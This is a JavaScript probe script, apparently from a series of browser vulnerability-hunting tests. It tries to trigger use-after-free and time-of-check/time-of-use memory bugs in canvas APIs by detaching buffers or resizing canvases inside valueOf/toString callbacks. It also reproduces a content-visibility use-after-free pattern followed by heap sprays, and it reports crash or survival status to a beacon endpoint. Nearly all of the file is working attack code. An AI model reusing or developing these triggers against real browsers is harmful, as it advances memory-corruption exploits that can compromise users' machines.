// p113-canvas-cv.js — Canvas TOCTOU + content-visibility UAF
//
// CREATIVE APPROACH: Canvas operations capture the ImageData object BEFORE
// converting coordinate arguments via ToNumber. If valueOf detaches the
// ImageData's backing buffer during coordinate conversion, putImageData
// reads from freed/detached memory. The C++ putImageData may not re-check
// if the ImageData's Uint8ClampedArray buffer is still valid.
//
// Also tests content-visibility UAF (adapted from Dark-life944/poc pattern):
// hidden → remove child → setTimeout → auto → heap spray
//
// Beacon prefix: V113C-

(function(){
var RUN = 'v113c' + Math.random().toString(36).slice(2,14);
var BC = '/beacon/V113C-';

function send(tag, data) {
    var body = JSON.stringify({r: RUN, b: typeof data === 'string' ? data : JSON.stringify(data)});
    try { navigator.sendBeacon(BC + tag, body); } catch(e) {}
}

var hb = setInterval(function(){ send('HB','hb'); }, 5000);

setTimeout(function() {
    send('L', 'press113-canvas-cv');

    // ═══════════════════════════════════════════════════════════════
    // C1: putImageData — detach ImageData buffer via dx valueOf
    // ImageData is captured first, then dx.valueOf detaches its buffer.
    // Does putImageData read from the freed backing store?
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 64; canvas.height = 64;
            var ctx = canvas.getContext('2d');
            ctx.fillStyle = '#FF0000';
            ctx.fillRect(0, 0, 64, 64);

            var imgData = ctx.getImageData(0, 0, 64, 64);
            var imgBuf = imgData.data.buffer;
            var imgBufLen = imgBuf.byteLength;

            var c1_clone = null;
            var c1_valOfCount = 0;
            var evilDx = {
                valueOf: function() {
                    c1_valOfCount++;
                    if (!c1_clone) {
                        try {
                            c1_clone = structuredClone({x: imgBuf}, {transfer: [imgBuf]});
                        } catch(te) {
                            c1_clone = 'TRANSFER_ERR:' + te.constructor.name;
                        }
                    }
                    return 0;
                }
            };

            var c1_err = null;
            try {
                ctx.putImageData(imgData, evilDx, 0);
            } catch(e) {
                c1_err = e.constructor.name + ':' + e.message.slice(0, 60);
            }

            var c1_bufDetached = (imgBuf.byteLength === 0);
            var c1_dataLen = -1;
            try { c1_dataLen = imgData.data.length; } catch(e2) {}

            // Check if canvas pixels changed (if putImageData read from detached = garbage)
            var c1_after = null;
            try {
                var check = ctx.getImageData(0, 0, 4, 4);
                c1_after = check.data[0] + ',' + check.data[1] + ',' + check.data[2];
            } catch(e3) {}

            send('C1-PUT-DETACH', {
                valOfCount: c1_valOfCount,
                err: c1_err,
                bufDetached: c1_bufDetached,
                origBufLen: imgBufLen,
                dataLen: c1_dataLen,
                cloneType: typeof c1_clone === 'string' ? c1_clone : 'ok',
                pixelsAfter: c1_after,
                SURVIVED: true
            });
        } catch(e) {
            send('C1-PUT-DETACH', {err: e.constructor.name + ':' + e.message.slice(0, 80), SURVIVED: false});
        }
    }, 100);

    // ═══════════════════════════════════════════════════════════════
    // C2: putImageData — resize canvas via dx valueOf
    // Canvas resize frees old backing bitmap. putImageData writes
    // pixel data into... the new (1x1) bitmap? Or stale pointer?
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 256; canvas.height = 256;
            var ctx = canvas.getContext('2d');
            ctx.fillStyle = '#00FF00';
            ctx.fillRect(0, 0, 256, 256);

            var imgData = ctx.getImageData(0, 0, 256, 256);

            var c2_valOfCount = 0;
            var evilDx = {
                valueOf: function() {
                    c2_valOfCount++;
                    if (c2_valOfCount === 1) {
                        canvas.width = 1;  // Nuke the backing bitmap
                        canvas.height = 1;
                    }
                    return 0;
                }
            };

            var c2_err = null;
            try {
                ctx.putImageData(imgData, evilDx, 0);
            } catch(e) {
                c2_err = e.constructor.name;
            }

            // Check: is the canvas still 1x1? Did putImageData crash/corrupt?
            send('C2-PUT-RESIZE', {
                valOfCount: c2_valOfCount,
                err: c2_err,
                canvasW: canvas.width,
                canvasH: canvas.height,
                SURVIVED: true
            });
        } catch(e) {
            send('C2-PUT-RESIZE', {err: e.constructor.name, SURVIVED: false});
        }
    }, 500);

    // ═══════════════════════════════════════════════════════════════
    // C3: getImageData — resize canvas via sx valueOf
    // Canvas backing store is freed during sx conversion.
    // getImageData tries to read from stale backing store.
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 256; canvas.height = 256;
            var ctx = canvas.getContext('2d');
            ctx.fillStyle = '#0000FF';
            ctx.fillRect(0, 0, 256, 256);

            var c3_valOfCount = 0;
            var evilSx = {
                valueOf: function() {
                    c3_valOfCount++;
                    if (c3_valOfCount === 1) {
                        canvas.width = 1;
                        canvas.height = 1;
                    }
                    return 0;
                }
            };

            var c3_err = null;
            var c3_dataLen = -1;
            var c3_pixels = null;
            try {
                var result = ctx.getImageData(evilSx, 0, 256, 256);
                c3_dataLen = result.data.length;
                c3_pixels = result.data[0] + ',' + result.data[100] + ',' + result.data[1000];
            } catch(e) {
                c3_err = e.constructor.name + ':' + e.message.slice(0, 60);
            }

            send('C3-GET-RESIZE', {
                valOfCount: c3_valOfCount,
                err: c3_err,
                dataLen: c3_dataLen,
                pixels: c3_pixels,
                canvasW: canvas.width,
                canvasH: canvas.height,
                SURVIVED: true
            });
        } catch(e) {
            send('C3-GET-RESIZE', {err: e.constructor.name, SURVIVED: false});
        }
    }, 900);

    // ═══════════════════════════════════════════════════════════════
    // C4: drawImage — resize DEST canvas via dx valueOf
    // Source canvas is fine, dest backing store freed during valueOf
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var src = document.createElement('canvas');
            src.width = 64; src.height = 64;
            var srcCtx = src.getContext('2d');
            srcCtx.fillStyle = '#FF00FF';
            srcCtx.fillRect(0, 0, 64, 64);

            var dest = document.createElement('canvas');
            dest.width = 256; dest.height = 256;
            var destCtx = dest.getContext('2d');

            var c4_valOfCount = 0;
            var evilDx = {
                valueOf: function() {
                    c4_valOfCount++;
                    if (c4_valOfCount === 1) {
                        dest.width = 1;
                        dest.height = 1;
                    }
                    return 0;
                }
            };

            var c4_err = null;
            try {
                destCtx.drawImage(src, evilDx, 0);
            } catch(e) {
                c4_err = e.constructor.name;
            }

            send('C4-DRAW-RESIZE', {
                valOfCount: c4_valOfCount,
                err: c4_err,
                destW: dest.width,
                destH: dest.height,
                SURVIVED: true
            });
        } catch(e) {
            send('C4-DRAW-RESIZE', {err: e.constructor.name, SURVIVED: false});
        }
    }, 1300);

    // ═══════════════════════════════════════════════════════════════
    // C5: fillRect with valueOf that resizes canvas (4 valueOf calls)
    // x, y, width, height all go through ToNumber
    // Resize on x valueOf, then y/w/h operate on stale context
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 256; canvas.height = 256;
            var ctx = canvas.getContext('2d');
            ctx.fillStyle = '#FFFF00';
            ctx.fillRect(0, 0, 256, 256);

            var c5_callOrder = [];
            var evilX = {
                valueOf: function() {
                    c5_callOrder.push('x');
                    canvas.width = 4;
                    canvas.height = 4;
                    ctx.fillStyle = '#00FFFF';
                    return 0;
                }
            };

            var c5_err = null;
            try {
                ctx.fillRect(evilX, 0, 256, 256);
            } catch(e) {
                c5_err = e.constructor.name;
            }

            // Check what happened to the canvas
            var c5_pixels = null;
            try {
                var check = ctx.getImageData(0, 0, 4, 4);
                c5_pixels = check.data[0] + ',' + check.data[1] + ',' + check.data[2];
            } catch(e3) {}

            send('C5-FILL-RESIZE', {
                callOrder: c5_callOrder.join(','),
                err: c5_err,
                canvasW: canvas.width,
                canvasH: canvas.height,
                pixels: c5_pixels,
                SURVIVED: true
            });
        } catch(e) {
            send('C5-FILL-RESIZE', {err: e.constructor.name, SURVIVED: false});
        }
    }, 1700);

    // ═══════════════════════════════════════════════════════════════
    // C6: Is ImageData.data.buffer transferable?
    // If yes: transfer creates a UAF vector for any API that uses ImageData
    // If no: transfer throws DataCloneError
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 16; canvas.height = 16;
            var ctx = canvas.getContext('2d');
            ctx.fillStyle = '#FF0000';
            ctx.fillRect(0, 0, 16, 16);

            var imgData = ctx.getImageData(0, 0, 16, 16);
            var buf = imgData.data.buffer;
            var origLen = buf.byteLength;

            var c6_transferErr = null;
            var c6_clone = null;
            try {
                c6_clone = structuredClone({x: buf}, {transfer: [buf]});
            } catch(e) {
                c6_transferErr = e.constructor.name + ':' + e.message.slice(0, 60);
            }

            var c6_detached = (buf.byteLength === 0);
            var c6_dataAccess = null;
            try {
                c6_dataAccess = imgData.data[0];
            } catch(e2) {
                c6_dataAccess = 'ERR:' + e2.constructor.name;
            }

            send('C6-IMGDATA-XFER', {
                origLen: origLen,
                transferErr: c6_transferErr,
                detached: c6_detached,
                dataAccess: c6_dataAccess,
                TRANSFERABLE: (c6_transferErr === null),
                SURVIVED: true
            });
        } catch(e) {
            send('C6-IMGDATA-XFER', {err: e.constructor.name, SURVIVED: false});
        }
    }, 2100);

    // ═══════════════════════════════════════════════════════════════
    // C7: content-visibility UAF (adapted from Dark-life944/poc)
    // Pattern: hidden → remove child → setTimeout → auto → spray
    // Beacon-based crash detection: send beacon BEFORE trigger
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            send('C7-CV-PRE', 'about-to-trigger');

            var container = document.createElement('div');
            container.style.cssText = 'width:200px;height:200px;position:absolute;top:-9999px;';
            container.style.contentVisibility = 'auto';
            document.body.appendChild(container);

            // Create children with z-index (positive z-order list)
            var children = [];
            for (var i = 0; i < 20; i++) {
                var child = document.createElement('div');
                child.style.cssText = 'position:relative;z-index:' + (i+1) + ';width:50px;height:50px;background:red;';
                child.textContent = 'child' + i;
                container.appendChild(child);
                children.push(child);
            }

            // Force layout
            container.offsetHeight;

            // Step 1: Set hidden
            container.style.contentVisibility = 'hidden';
            container.offsetHeight;

            // Step 2: Remove children
            for (var i = 0; i < children.length; i++) {
                children[i].remove();
            }

            // Step 3: setTimeout → set auto → spray
            setTimeout(function() {
                try {
                    container.style.contentVisibility = 'auto';

                    // Heap spray — fill freed z-order list memory
                    var spray = [];
                    for (var i = 0; i < 2000; i++) {
                        var a = new Uint8Array(64);
                        a.fill(0x41);
                        spray.push(a);
                    }

                    // Force layout — trigger compositing traversal on stale z-order lists
                    container.offsetHeight;

                    // If we get here, no crash
                    send('C7-CV-UAF', {
                        phase: 'survived',
                        sprayLen: spray.length,
                        SURVIVED: true
                    });
                } catch(e) {
                    send('C7-CV-UAF', {err: e.constructor.name, phase: 'inner', SURVIVED: false});
                }
            }, 0);

        } catch(e) {
            send('C7-CV-UAF', {err: e.constructor.name, phase: 'outer', SURVIVED: false});
        }
    }, 2500);

    // ═══════════════════════════════════════════════════════════════
    // C8: content-visibility deep nesting variant
    // Nested containers with content-visibility toggling
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            send('C8-CV-NEST-PRE', 'nested-trigger');

            var outer = document.createElement('div');
            outer.style.cssText = 'position:absolute;top:-9999px;width:300px;height:300px;';
            outer.style.contentVisibility = 'auto';
            document.body.appendChild(outer);

            var inner = document.createElement('div');
            inner.style.cssText = 'position:relative;width:200px;height:200px;';
            inner.style.contentVisibility = 'auto';
            outer.appendChild(inner);

            var deepChildren = [];
            for (var i = 0; i < 30; i++) {
                var d = document.createElement('div');
                d.style.cssText = 'position:relative;z-index:' + (i+1) + ';width:40px;height:40px;';
                inner.appendChild(d);
                deepChildren.push(d);
            }

            outer.offsetHeight;

            // Toggle outer hidden
            outer.style.contentVisibility = 'hidden';
            outer.offsetHeight;

            // Remove inner's children
            for (var i = 0; i < deepChildren.length; i++) deepChildren[i].remove();

            // Toggle inner hidden too
            inner.style.contentVisibility = 'hidden';

            setTimeout(function() {
                try {
                    // Set both back to auto
                    outer.style.contentVisibility = 'auto';
                    inner.style.contentVisibility = 'auto';

                    var spray = [];
                    for (var i = 0; i < 2000; i++) {
                        spray.push(new Uint8Array(64));
                        spray[i].fill(0x42);
                    }

                    outer.offsetHeight;
                    inner.offsetHeight;

                    send('C8-CV-NEST', {phase: 'survived', SURVIVED: true});
                } catch(e) {
                    send('C8-CV-NEST', {err: e.constructor.name, SURVIVED: false});
                }
            }, 0);
        } catch(e) {
            send('C8-CV-NEST', {err: e.constructor.name, phase: 'outer', SURVIVED: false});
        }
    }, 3200);

    // ═══════════════════════════════════════════════════════════════
    // C9: content-visibility with animation + removal
    // Animate element, set content-visibility hidden, remove during animation
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            send('C9-CV-ANIM-PRE', 'anim-trigger');

            var box = document.createElement('div');
            box.style.cssText = 'position:absolute;top:-9999px;width:200px;height:200px;';
            box.style.contentVisibility = 'auto';
            document.body.appendChild(box);

            var animTarget = document.createElement('div');
            animTarget.style.cssText = 'position:relative;z-index:5;width:100px;height:100px;background:blue;';
            box.appendChild(animTarget);

            box.offsetHeight;

            // Start animation
            var anim = animTarget.animate(
                [{transform:'scale(1)'}, {transform:'scale(2)'}],
                {duration: 100, iterations: Infinity}
            );

            // Immediately: hidden + remove + auto
            box.style.contentVisibility = 'hidden';
            animTarget.remove();

            setTimeout(function() {
                try {
                    box.style.contentVisibility = 'auto';
                    box.offsetHeight;

                    // Check if animation is still going
                    var animState = anim.playState;

                    send('C9-CV-ANIM', {
                        animState: animState,
                        SURVIVED: true
                    });
                } catch(e) {
                    send('C9-CV-ANIM', {err: e.constructor.name, SURVIVED: false});
                }
            }, 0);
        } catch(e) {
            send('C9-CV-ANIM', {err: e.constructor.name, phase: 'outer', SURVIVED: false});
        }
    }, 3900);

    // ═══════════════════════════════════════════════════════════════
    // C10: measureText with font mutation during valueOf
    // ctx.measureText(text) — text goes through ToString.
    // During toString, we delete the font and force GC.
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 100; canvas.height = 100;
            var ctx = canvas.getContext('2d');
            ctx.font = '48px serif';

            var c10_toStrCount = 0;
            var evilText = {
                toString: function() {
                    c10_toStrCount++;
                    // Nuke the canvas context state
                    canvas.width = 1;
                    canvas.height = 1;
                    return 'AAAA BBBB CCCC DDDD';
                }
            };

            var c10_err = null;
            var c10_width = -1;
            try {
                var metrics = ctx.measureText(evilText);
                c10_width = metrics.width;
            } catch(e) {
                c10_err = e.constructor.name;
            }

            send('C10-MEASURE-NUKE', {
                toStrCount: c10_toStrCount,
                err: c10_err,
                width: c10_width,
                canvasW: canvas.width,
                SURVIVED: true
            });
        } catch(e) {
            send('C10-MEASURE-NUKE', {err: e.constructor.name, SURVIVED: false});
        }
    }, 4500);

    // ═══════════════════════════════════════════════════════════════
    // C11: createPattern with source canvas that gets nuked via valueOf
    // createPattern(image, repetition) — repetition goes through DOMString
    // conversion. During conversion, nuke the source canvas.
    // ═══════════════════════════════════════════════════════════════
    setTimeout(function() {
        try {
            var src = document.createElement('canvas');
            src.width = 64; src.height = 64;
            var srcCtx = src.getContext('2d');
            srcCtx.fillStyle = '#FF00FF';
            srcCtx.fillRect(0, 0, 64, 64);

            var dest = document.createElement('canvas');
            dest.width = 256; dest.height = 256;
            var destCtx = dest.getContext('2d');

            var c11_toStrCount = 0;
            var evilRep = {
                toString: function() {
                    c11_toStrCount++;
                    src.width = 1; // Nuke source canvas backing store
                    src.height = 1;
                    return 'repeat';
                }
            };

            var c11_err = null;
            var c11_pattern = null;
            try {
                c11_pattern = destCtx.createPattern(src, evilRep);
            } catch(e) {
                c11_err = e.constructor.name;
            }

            // Try to use the pattern
            var c11_fillErr = null;
            if (c11_pattern) {
                try {
                    destCtx.fillStyle = c11_pattern;
                    destCtx.fillRect(0, 0, 256, 256);
                } catch(e2) {
                    c11_fillErr = e2.constructor.name;
                }
            }

            send('C11-PATTERN-NUKE', {
                toStrCount: c11_toStrCount,
                err: c11_err,
                hasPattern: (c11_pattern !== null),
                fillErr: c11_fillErr,
                SURVIVED: true
            });
        } catch(e) {
            send('C11-PATTERN-NUKE', {err: e.constructor.name, SURVIVED: false});
        }
    }, 4900);

    // Done
    setTimeout(function() {
        clearInterval(hb);
        send('Z2', 'probe113-done');
    }, 5800);

}, 500);

})();
